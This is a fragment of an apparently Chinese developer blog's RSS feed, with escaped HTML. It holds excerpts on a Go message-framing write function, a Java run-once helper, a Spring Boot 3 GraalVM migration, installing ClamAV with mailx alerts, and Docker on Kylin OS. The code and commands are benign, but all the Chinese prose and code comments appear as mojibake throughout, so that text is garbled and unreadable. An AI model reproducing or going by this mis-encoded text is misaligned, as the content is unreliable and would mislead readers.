&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">func&lt;/span> &lt;span style="color:#50fa7b">Write&lt;/span>(conn net.Conn, flag &lt;span style="color:#8be9fd">int&lt;/span>, body []&lt;span style="color:#8be9fd">byte&lt;/span>) &lt;span style="color:#8be9fd">error&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">if&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">len&lt;/span>(body) &amp;gt; MaxBodyLen {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">return&lt;/span> fmt.&lt;span style="color:#50fa7b">Errorf&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;too large body, body length must be &amp;lt;= %d&amp;#34;&lt;/span>, MaxBodyLen)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> bodyLen &lt;span style="color:#ff79c6">:=&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">make&lt;/span>([]&lt;span style="color:#8be9fd">byte&lt;/span>, &lt;span style="color:#bd93f9">4&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> binary.BigEndian.&lt;span style="color:#50fa7b">PutUint32&lt;/span>(bodyLen, &lt;span style="color:#8be9fd;font-style:italic">uint32&lt;/span>(&lt;span style="color:#8be9fd;font-style:italic">len&lt;/span>(body)))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> hdr &lt;span style="color:#ff79c6">:=&lt;/span> []&lt;span style="color:#8be9fd">byte&lt;/span>{&lt;span style="color:#bd93f9">0x01&lt;/span>, &lt;span style="color:#8be9fd;font-style:italic">byte&lt;/span>(flag)}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> hdr = &lt;span style="color:#8be9fd;font-style:italic">append&lt;/span>(hdr, &lt;span style="color:#8be9fd;font-style:italic">make&lt;/span>([]&lt;span style="color:#8be9fd">byte&lt;/span>, &lt;span style="color:#bd93f9">2&lt;/span>)&lt;span style="color:#ff79c6">...&lt;/span>) &lt;span style="color:#6272a4">// è¡¥2ä¸ª0è®©æ¶ˆæ¯å¤´æ€»é•¿åº¦ä¸º8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> hdr = &lt;span style="color:#8be9fd;font-style:italic">append&lt;/span>(hdr, bodyLen&lt;span style="color:#ff79c6">...&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> writeBody &lt;span style="color:#ff79c6">:=&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">make&lt;/span>([]&lt;span style="color:#8be9fd">byte&lt;/span>, &lt;span style="color:#bd93f9">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> writeBody = &lt;span style="color:#8be9fd;font-style:italic">append&lt;/span>(writeBody, hdr&lt;span style="color:#ff79c6">...&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> writeBody = &lt;span style="color:#8be9fd;font-style:italic">append&lt;/span>(writeBody, body&lt;span style="color:#ff79c6">...&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _, err &lt;span style="color:#ff79c6">:=&lt;/span> conn.&lt;span style="color:#50fa7b">Write&lt;/span>(writeBody)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">return&lt;/span> err
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>åœ¨ Java é‡Œå¦‚ä½•è®©æ–¹æ³•åªæ‰§è¡Œä¸€æ¬¡ï¼Ÿ</title><link>https://www.typesafe.cn/posts/how-does-java-make-methods-execute-only-once/</link><pubDate>Sun, 02 Apr 2023 13:18:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/how-does-java-make-methods-execute-only-once/</guid><description>&lt;p>æœ€è¿‘ä¸€å¹´æ—¶é—´ä¸€ç›´åœ¨å†™ Golang ï¼Œä¹Ÿç®—æ˜¯å¯¹ Golang æœ‰äº†åˆæ­¥çš„æŒæ¡ï¼Œå†æ¬¡å†™ Java çš„æ—¶å€™å‘ç°æœ‰ç‚¹ç”Ÿç–äº†ï¼Œå†™ä»£ç çš„æ—¶å€™ä¹Ÿä¸è‡ªè§‰ä»£å…¥äº†å†™ Golang çš„æ€ç»´ã€‚&lt;/p>
&lt;p>æ­£å¦‚æˆ‘æƒ³è¦åœ¨ Java é‡Œé¢æƒ³è®©æŸä¸€ä¸ªæ–¹æ³•åªæ‰§è¡Œä¸€æ¬¡çš„æ—¶å€™ï¼Œæˆ‘ç¬¬ä¸€æ—¶é—´æƒ³åˆ°äº† Golang é‡Œé¢çš„ &lt;code>Once&lt;/code> åŠŸèƒ½ã€‚&lt;/p>
&lt;blockquote>
&lt;p>&lt;code>sync.Once&lt;/code> æ˜¯ Golang çš„ä¸€ä¸ªå¹¶å‘åŸè¯­ï¼Œå®ƒæä¾›äº†ä¸€ç§å®‰å…¨åœ°åœ¨å¤šä¸ª goroutine ä¸­æ‰§è¡ŒæŸä¸ªå‡½æ•°ï¼ˆæˆ–ä»£ç å—ï¼‰ä¸€æ¬¡çš„æœºåˆ¶ã€‚&lt;/p>
&lt;p>&lt;code>sync.Once&lt;/code> ç±»å‹æœ‰ä¸€ä¸ª &lt;code>Do&lt;/code> æ–¹æ³•ï¼Œè¯¥æ–¹æ³•æ¥æ”¶ä¸€ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°ï¼Œå¹¶ç¡®ä¿è¿™ä¸ªå‡½æ•°åªä¼šè¢«æ‰§è¡Œä¸€æ¬¡ï¼Œæ— è®ºæœ‰å¤šå°‘ä¸ª goroutine åŒæ—¶è°ƒç”¨å®ƒã€‚å…·ä½“æ¥è¯´ï¼Œç¬¬ä¸€ä¸ªè°ƒç”¨ Do æ–¹æ³•çš„ goroutine ä¼šæ‰§è¡Œè¿™ä¸ªå‡½æ•°ï¼Œè€Œå…¶ä»– goroutine åˆ™ä¼šç­‰å¾…å®ƒå®Œæˆï¼Œç„¶åè¿”å›ç›¸åŒçš„ç»“æœã€‚&lt;/p>
&lt;p>&lt;code>sync.Once&lt;/code> å¯ä»¥ç”¨äºä¸€äº›éœ€è¦å…¨å±€åˆå§‹åŒ–çš„åœºæ™¯ï¼Œæ¯”å¦‚åˆå§‹åŒ–é…ç½®ä¿¡æ¯ã€æ•°æ®åº“è¿æ¥ç­‰ã€‚ä½¿ç”¨ sync.Once å¯ä»¥ç¡®ä¿è¿™äº›åˆå§‹åŒ–åªä¼šè¢«æ‰§è¡Œä¸€æ¬¡ï¼Œå¹¶ä¸”å¯ä»¥å®‰å…¨åœ°è¢«å¤šä¸ª goroutine å…±äº«ä½¿ç”¨ã€‚&lt;/p>
&lt;p>&amp;ndash; æ¥è‡ª ChatGPT&lt;/p>&lt;/blockquote>
&lt;p>å…¶å®å’Œ&lt;code>å•ä¾‹æ¨¡å¼&lt;/code>å·®ä¸å¤šï¼Œä½†æˆ‘æƒ³è¦çš„æ˜¯è®©æ–¹æ³•åªæ‰§è¡Œä¸€æ¬¡ï¼Œæˆ‘é­”æ”¹äº†ä¸€ä¸‹ï¼Œç›´æ¥ä¸Šä»£ç å§ã€‚&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">package&lt;/span> cn.typesafe.sync;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> lombok.SneakyThrows;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> java.util.concurrent.Callable;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">class&lt;/span> &lt;span style="color:#50fa7b">Once&lt;/span>&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>T&lt;span style="color:#ff79c6">&amp;gt;&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#8be9fd;font-style:italic">private&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">volatile&lt;/span> T t &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	@SneakyThrows
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> T &lt;span style="color:#50fa7b">doOnce&lt;/span>(Callable&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>T&lt;span style="color:#ff79c6">&amp;gt;&lt;/span> action) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#ff79c6">if&lt;/span> (t &lt;span style="color:#ff79c6">==&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#8be9fd;font-style:italic">synchronized&lt;/span> (&lt;span style="color:#ff79c6">this&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>				&lt;span style="color:#ff79c6">if&lt;/span> (t &lt;span style="color:#ff79c6">==&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>					t &lt;span style="color:#ff79c6">=&lt;/span> action.&lt;span style="color:#50fa7b">call&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>				}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#ff79c6">return&lt;/span> t;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å•å…ƒæµ‹è¯•&lt;/p></description></item><item><title>SpringBoot 3.0.0å°é²œä¸Javaæ‰“åŒ…åŸç”ŸäºŒè¿›åˆ¶ã€ä¸€ã€‘</title><link>https://www.typesafe.cn/posts/kafka-map-springboot3-graalvm-1/</link><pubDate>Sat, 26 Nov 2022 23:44:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/kafka-map-springboot3-graalvm-1/</guid><description>&lt;p>2022å¹´11æœˆ24æ—¥ SpringBoot æ­£å¼å‘å¸ƒäº† 3.0 ç‰ˆæœ¬ï¼Œå¸¦æ¥è®¸å¤šæ–°çš„ç‰¹æ€§ï¼Œä½†æˆ‘æœ€å…³å¿ƒçš„è¿˜æ˜¯Javaæ‰“åŒ…æˆåŸç”ŸäºŒè¿›åˆ¶ï¼Œè¿è¡Œæ—¶ä¸å†ä¾èµ–jreç¯å¢ƒï¼Œè¿è¡ŒJavaç¨‹åºå°†å’ŒGoç¨‹åºä¸€æ ·æ–¹ä¾¿ã€‚&lt;/p>
&lt;h2 id="å‡çº§è‡³-springboot-300">å‡çº§è‡³ SpringBoot 3.0.0&lt;/h2>
&lt;p>è¯´æ˜¯å°é²œï¼Œä½†æ˜¯æˆ‘ä¸æƒ³å†è¯•ç€æ hello world é‚£ç§å•¥éƒ½æ²¡æœ‰çš„ä¸œè¥¿äº†ï¼Œæ‰¾åˆ°æˆ‘ä¹‹å‰å†™çš„ä¸€ä¸ªJavaå¼€æºé¡¹ç›® &lt;a href="https://github.com/dushixiang/kafka-map">kafka-map&lt;/a> æ‹¿ä»–å¼€åˆ€ã€‚&lt;/p>
&lt;p>&lt;a href="https://github.com/dushixiang/kafka-map">kafka-map&lt;/a> æœ¬èº«æ˜¯åŸºäº SpringBoot 2.4.x å¼€å‘çš„ï¼Œsqlite å­˜å‚¨æ•°æ®ï¼Œä¸”å¾ˆä¹…æ²¡æœ‰å¤§çš„æ›´æ–°äº†ï¼Œæƒ³è¦ç›´æ¥å‡çº§åˆ° SpringBoot 3.0.0 æ˜¯ä¸å¯èƒ½çš„ï¼Œæˆ‘æŒ‰ç…§å®˜æ–¹æ–‡æ¡£ &lt;a href="https://github.com/spring-projects/spring-boot/wiki/Spring-Boot-3.0-Migration-Guide">Spring Boot 3.0 è¿ç§»æŒ‡å—&lt;/a> é¦–å…ˆå‡çº§åˆ°æœ€æ–°2.7.xç‰ˆæœ¬ï¼Œç„¶åå°±å‘ç° service ä¾èµ–å¾ªç¯äº†ï¼Œè¿™ä¸ªæ—¶å€™æœ‰ä¸¤ç§é€‰æ‹©ï¼Œä¸€æ˜¯åœ¨é…ç½®æ–‡ä»¶ä¸­å…è®¸ä¾èµ–å¾ªç¯ &lt;code>spring.main.allow-circular-references: true&lt;/code>ï¼ŒäºŒæ˜¯æ¢³ç†ä¸šåŠ¡é€»è¾‘è§£å†³ä¾èµ–å¾ªç¯çš„é—®é¢˜ã€‚ä½œä¸ºä¸€ä¸ªåˆæ ¼çš„å¼€å‘ï¼Œæˆ‘é€‰æ‹©äº†è§£å†³ä¾èµ–å¾ªç¯çš„é—®é¢˜ï¼Œè¿‡ç¨‹ä¸è¡¨ã€‚&lt;/p>
&lt;p>SpringBoot 3.0.0 å‡çº§äº†å¾ˆå¤šç»„ä»¶ï¼Œå…¶ä¸­ Jpa ä¾èµ–çš„ Hibernate å‡çº§åˆ°äº† 6.xï¼Œæˆ‘å¯åŠ¨æ—¶åˆé‡åˆ°äº† sqlite æ–¹è¨€æ’ä»¶ä¸å¯ç”¨çš„é—®é¢˜ï¼Œè¿˜å¥½ Hibernate 6.x å·²ç»æ”¯æŒäº† sqliteæ–¹è¨€ï¼Œåˆ‡æ¢åˆ°å®˜æ–¹æ’ä»¶å°±å¥½äº†ã€‚é…ç½®æ–‡ä»¶å¦‚ä¸‹ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-yaml" data-lang="yaml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">spring&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">datasource&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">url&lt;/span>: jdbc:sqlite:data/kafka-map.db
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">driver-class-name&lt;/span>: org.sqlite.JDBC
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">jpa&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">hibernate&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">ddl-auto&lt;/span>: update
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">show-sql&lt;/span>: &lt;span style="color:#ff79c6">true&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">properties&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">hibernate&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">dialect&lt;/span>: org.hibernate.community.dialect.SQLiteDialect
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="åŸç”ŸäºŒè¿›åˆ¶æ‰“åŒ…">åŸç”ŸäºŒè¿›åˆ¶æ‰“åŒ…&lt;/h2>
&lt;p>æ‰“åŒ…åŸç”ŸäºŒè¿›åˆ¶è¿˜æ˜¯æœ€æŠ˜è…¾çš„ï¼Œåˆšå¼€å§‹å‚è€ƒ&lt;a href="https://docs.spring.io/spring-boot/docs/3.0.0/reference/html/native-image.html#native-image.developing-your-first-application.buildpacks">GraalVM Native Image Support&lt;/a> æŠŠæ‰“åŒ… &lt;code>springboot:build-image&lt;/code> å½“æˆäº†æ‰“åŒ…åŸç”ŸäºŒè¿›åˆ¶äº†ï¼Œè€Œä¸”æ‰“åŒ…çš„è¿‡ç¨‹ä¸­è¿˜é‡åˆ°äº† &lt;code>UnsupportedFeatureException: No instances of ch.qos.logback.classic.Logger&lt;/code> è¿™ä¸ªé—®é¢˜ï¼Œæ‰¾äº†ä¸€åœˆä¹Ÿæ²¡æ‰¾åˆ°è§£å†³æ–¹æ¡ˆã€‚&lt;/p></description></item><item><title>Linux æ€æ¯’è½¯ä»¶ ClamAV å®‰è£…</title><link>https://www.typesafe.cn/posts/clamav-install/</link><pubDate>Mon, 07 Mar 2022 21:52:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/clamav-install/</guid><description>&lt;p>&lt;strong>Clam AntiVirus&lt;/strong>ï¼ˆ&lt;strong>ClamAV&lt;/strong>ï¼‰æ˜¯å…è´¹è€Œä¸”å¼€æ”¾æºä»£ç çš„æ€æ¯’è½¯ä»¶ï¼Œè½¯ä»¶ä¸ç—…æ¯’ç çš„æ›´æ–°çš†ç”±ç¤¾ç¾¤å…è´¹å‘å¸ƒã€‚Github åœ°å€ï¼šhttps://github.com/Cisco-Talos/clamav&lt;/p>
&lt;h3 id="å®‰è£…-clamav">å®‰è£… ClamAV&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>yum install -y clamav*
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="é…ç½®-clamav">é…ç½® ClamAV&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>cat &amp;gt; /etc/freshclam.conf &lt;span style="color:#f1fa8c">&amp;lt;&amp;lt;EOF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c"># æ•°æ®åº“é…ç½®æ–‡ä»¶å¤¹
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c">DatabaseDirectory /var/lib/clamav
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c"># æ›´æ–°æ—¥å¿—æ–‡ä»¶å¤¹
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c">UpdateLogFile /var/log/freshclam.log
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c"># æ—¥å¿—å¤§å°
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c">LogFileMaxSize 2M
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c"># æ—¥å¿—è®°å½•æ—¶é—´
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c">LogTime yes
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c"># æ‰€å±ç”¨æˆ·
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c">DatabaseOwner root
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c"># åŒæ­¥ç—…æ¯’åº“çš„åœ°å€
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c">DatabaseMirror database.clamav.net
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c">EOF&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="æ›´æ–°ç—…æ¯’åº“">æ›´æ–°ç—…æ¯’åº“&lt;/h3>
&lt;p>å¤§æ¦‚éœ€è¦å‡ åˆ†é’Ÿæ—¶é—´&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>freshclam
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="è¿›è¡Œç—…æ¯’æ‰«ææµ‹è¯•">è¿›è¡Œç—…æ¯’æ‰«ææµ‹è¯•&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>clamscan -ri &amp;lt;/path1/to/scan&amp;gt; &amp;lt;/path2/to/scan&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¸¸ç”¨é…ç½®è¯´æ˜&lt;/p>
&lt;pre tabindex="0">&lt;code>--recursive[=yes/no(*)] -r é€’å½’æŸ¥æ‰¾
--infected -I åªæ‰“å°å—å½±å“çš„æ–‡ä»¶ä¿¡æ¯
--remove[=yes/no(*)] åˆ é™¤å—å½±å“çš„æ–‡ä»¶ã€‚(ä¸å»ºè®®ä½¿ç”¨,æ ¹æ®æ‰«æç»“æœè¿›è¡Œæ‰‹åŠ¨åˆ é™¤,é¿å…è¯¯åˆ ã€‚)
&lt;/code>&lt;/pre>&lt;h3 id="é…ç½®é‚®ç®±">é…ç½®é‚®ç®±&lt;/h3>
&lt;p>å¦‚æœä¸éœ€è¦é‚®ä»¶é€šçŸ¥çš„å¯ä»¥å¿½ç•¥æ­¤æ­¥éª¤ã€‚&lt;/p>
&lt;h4 id="å®‰è£…é‚®ä»¶æœåŠ¡">å®‰è£…é‚®ä»¶æœåŠ¡&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>yum install -y mailx
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="ä¿®æ”¹é…ç½®">ä¿®æ”¹é…ç½®&lt;/h4>
&lt;p>ä¿®æ”¹å¤§å†™å­—æ¯ä¸ºä½ çš„é‚®ç®±é…ç½®&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>cat &amp;gt; /etc/mail.rc &lt;span style="color:#f1fa8c">&amp;lt;&amp;lt;EOF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c">set from=USERNAME@YOURDOMAIN.COM
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c">set smtp=smtps://smtp.exmail.qq.com:465
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c">set smtp-auth=login
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c">set smtp-auth-user=USERNAME@YOURDOMAIN.COM
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c">set smtp-auth-password=YOURPASSWORD
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c">set ssl-verify=ignore
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c">set nss-config-dir=/etc/pki/nssdb/
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c">EOF&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="å‘é€é‚®ä»¶è¿›è¡Œæµ‹è¯•">å‘é€é‚®ä»¶è¿›è¡Œæµ‹è¯•&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">echo&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;Your message&amp;#34;&lt;/span> | mail -v -s &lt;span style="color:#f1fa8c">&amp;#34;Message Subject&amp;#34;&lt;/span> email@address
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¦‚æœå‡ºç° â€œError in certificate: Peer&amp;rsquo;s certificate issuer is not recognizedâ€ å±äºæ­£å¸¸ã€‚&lt;/p></description></item><item><title>åœ¨é“¶æ²³éº’éºŸé«˜çº§æœåŠ¡å™¨æ“ä½œç³»ç»ŸV10ä¸Šå®‰è£…docker</title><link>https://www.typesafe.cn/posts/install-docker-on-kylinos/</link><pubDate>Tue, 21 Dec 2021 23:39:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/install-docker-on-kylinos/</guid><description>&lt;blockquote>
&lt;p>é“¶æ²³éº’éºŸé«˜çº§æœåŠ¡å™¨æ“ä½œç³»ç»Ÿ V10 æ˜¯é’ˆå¯¹ä¼ä¸šçº§å…³é”®ä¸šåŠ¡ï¼Œé€‚åº”è™šæ‹ŸåŒ–ã€ äº‘è®¡ç®—ã€å¤§æ•°æ®ã€å·¥ä¸šäº’è”ç½‘æ—¶ä»£å¯¹ä¸»æœºç³»ç»Ÿå¯é æ€§ã€å®‰å…¨æ€§ã€æ€§èƒ½ã€æ‰©å±•æ€§å’Œ å®æ—¶æ€§çš„éœ€æ±‚ï¼Œä¾æ® CMMI 5 çº§æ ‡å‡†ç ”åˆ¶çš„æä¾›å†…ç”Ÿå®‰å…¨ã€äº‘åŸç”Ÿæ”¯æŒã€å›½äº§ å¹³å°æ·±å…¥ä¼˜åŒ–ã€é«˜æ€§èƒ½ã€æ˜“ç®¡ç†çš„æ–°ä¸€ä»£è‡ªä¸»æœåŠ¡å™¨æ“ä½œç³»ç»Ÿï¼›åŒæºæ”¯æŒé£è…¾ã€ é¾™èŠ¯ã€ç”³å¨ã€å…†èŠ¯ã€æµ·å…‰ã€é²²é¹ç­‰è‡ªä¸»å¹³å°ï¼›å¯æ”¯æ’‘æ„å»ºå¤§å‹æ•°æ®ä¸­å¿ƒæœåŠ¡å™¨é«˜ å¯ç”¨é›†ç¾¤ã€è´Ÿè½½å‡è¡¡é›†ç¾¤ã€åˆ†å¸ƒå¼é›†ç¾¤æ–‡ä»¶ç³»ç»Ÿã€è™šæ‹ŸåŒ–åº”ç”¨å’Œå®¹å™¨äº‘å¹³å°ç­‰ï¼Œ å¯éƒ¨ç½²åœ¨ç‰©ç†æœåŠ¡å™¨å’Œè™šæ‹ŸåŒ–ç¯å¢ƒã€ç§æœ‰äº‘ã€å…¬æœ‰äº‘å’Œæ··åˆäº‘ç¯å¢ƒï¼›åº”ç”¨äºæ”¿åºœã€ å›½é˜²ã€é‡‘èã€æ•™è‚²ã€è´¢ç¨ã€å…¬å®‰ã€å®¡è®¡ã€äº¤é€šã€åŒ»ç–—ã€åˆ¶é€ ç­‰é¢†åŸŸã€‚&lt;/p>&lt;/blockquote>
